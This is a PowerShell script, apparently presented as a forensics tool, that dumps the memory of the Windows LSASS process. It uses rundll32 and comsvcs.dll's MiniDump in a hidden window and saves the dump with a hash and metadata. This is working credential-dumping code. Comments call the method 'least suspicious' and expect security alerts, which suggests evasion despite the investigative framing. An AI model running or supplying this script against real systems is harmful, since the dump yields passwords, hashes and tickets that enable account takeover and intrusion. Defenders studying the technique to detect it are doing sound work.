# Dump LSASS Memory
# Usage: dump-lsass-memory.ps1 -OutputPath <path>
# Purpose: Create LSASS memory dump for credential theft investigation
# WARNING: This is a sensitive forensics operation

param(
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "C:\Windows\Temp\forensics"
)

try {
    Write-Host "=== LSASS Memory Dump (FORENSICS) ===" -ForegroundColor Cyan
    Write-Host "WARNING: This operation may trigger security alerts" -ForegroundColor Yellow
    
    # Create output directory
    if (!(Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
    }
    
    $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $dumpFile = Join-Path $OutputPath "lsass_$timestamp.dmp"
    
    # Get LSASS process
    $lsass = Get-Process lsass
    Write-Host "LSASS Process ID: $($lsass.Id)" -ForegroundColor Yellow
    
    # Method 1: Try using Task Manager method (least suspicious)
    Write-Host "Creating memory dump using comsvcs.dll..." -ForegroundColor Yellow
    $command = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpFile full"
    
    # Execute dump
    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $command" -Wait -PassThru -WindowStyle Hidden
    
    if (Test-Path $dumpFile) {
        $fileSize = (Get-Item $dumpFile).Length / 1MB
        
        # Calculate hash for integrity
        $hash = (Get-FileHash -Path $dumpFile -Algorithm SHA256).Hash
        
        # Create metadata file
        $metadataFile = "$dumpFile.metadata.txt"
        @"
LSASS Memory Dump Metadata
===========================
Dump Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Computer: $env:COMPUTERNAME
Process ID: $($lsass.Id)
Dump File: $dumpFile
File Size: $([math]::Round($fileSize, 2)) MB
SHA256: $hash
Collected By: $env:USERNAME

WARNING: This file contains sensitive credential material.
Handle with appropriate security controls.
Analyze offline in isolated environment.
"@ | Out-File $metadataFile
        
        Write-Host "LSASS dump created successfully!" -ForegroundColor Green
        Write-Host "File: $dumpFile" -ForegroundColor Green
        Write-Host "Size: $([math]::Round($fileSize, 2)) MB" -ForegroundColor Green
        Write-Host "IMPORTANT: Secure this file immediately!" -ForegroundColor Red
        
        @{
            Success = $true
            DumpFile = $dumpFile
            FileSizeMB = [math]::Round($fileSize, 2)
            SHA256 = $hash
            MetadataFile = $metadataFile
            ProcessId = $lsass.Id
            Warning = "Contains sensitive credential material - handle securely"
        } | ConvertTo-Json
        
    } else {
        throw "Failed to create LSASS dump"
    }
    
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
    Write-Host "Note: This operation requires administrative privileges" -ForegroundColor Yellow
    @{
        Success = $false
        Error = $_.Exception.Message
    } | ConvertTo-Json
    exit 1
}
